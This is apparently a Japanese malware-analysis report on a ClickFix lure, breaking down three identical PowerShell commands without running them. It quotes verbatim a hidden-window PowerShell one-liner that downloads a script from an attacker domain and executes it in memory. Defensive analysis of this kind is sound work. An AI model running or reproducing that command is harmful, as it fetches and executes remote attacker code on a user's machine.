# ClickFix command解析: pt4, pt8, pt9

## 概要

`clickfix-command.txt`で収集済みのpt4, pt8, pt9を、実行せずに文字列・process・後段取得境界へ分解した結果です。
ClickFixはmalware familyではなく、利用者にcommandを貼り付けさせる初期アクセス手法として扱います。

- case ID: `20260825-command-pt4-pt8-pt9`
- stage domain: `imagehopeag.com`
- command SHA-256: `bb5c1b1bda6aec766c1d3091f0a48e6b56774ae6530c94c0d93603f5457a4bed`
- source file SHA-256: `8326ca91fcb530acaebfa6a42ea240fdfc6321e73090043cc60f63bd4d8296b0`
- 重複数: `3`
- command実行: `false`
- payload実行: `false`

## 実command line

```powershell
powershell -w 1 -c "iEX([System.Net.WebClient]::new().DownloadString('https://imagehopeag.com/hex/traffic'))"
```

## 復号結果

```text
該当なし（原文のまま解釈）
```

## 悪性process挙動

```text
利用者起点（Run dialogまたは既存shell） → powershell.exe → WebClient.DownloadString → 同一powershell.exe内でIEX評価
```

- pt4、pt8、pt9はbyte単位で同一である。
- [System.Net.WebClient]::new().DownloadStringでstageを文字列として取得する。
- 取得結果をiEXへ直結し、ファイルへ保存せず同一process内で評価する。
-w 1はPowerShellのWindowStyle数値指定で、画面非表示を狙った指定と評価する。

## 最終取得状態

- analyst probe: `https://imagehopeag.com/hex/traffic`
- 結果: `HTTP 403、5071 bytes、body SHA-256 2d859c90e8503f5d9fe1819c68b3ce36a30f5927d00d7d7ca61f4c10d5d38840`
- 後段script／payload復元: `false`

現在の限定GETでは実行可能な後段本文を復元できませんでした。したがって、確実に言える最終ローカル動作は「HTTP応答をPowerShellとしてメモリ内評価する」境界までです。後段が生成する追加process、永続化、最終malware familyは未確認であり、推測で補っていません。

analyst probeは原文または静的復号で得たURLへGETだけを行いました。probe結果を実行時証跡とは扱いません。

## 関連成果物

- [processとcommand詳細](OVERALL-LOGIC.md)
- [感染チェーン](INFECTION-CHAIN.md)
- [特徴](FEATURES.md)
- [IOC](IOC-LIST.md)
- [構造化解析](analysis.json)
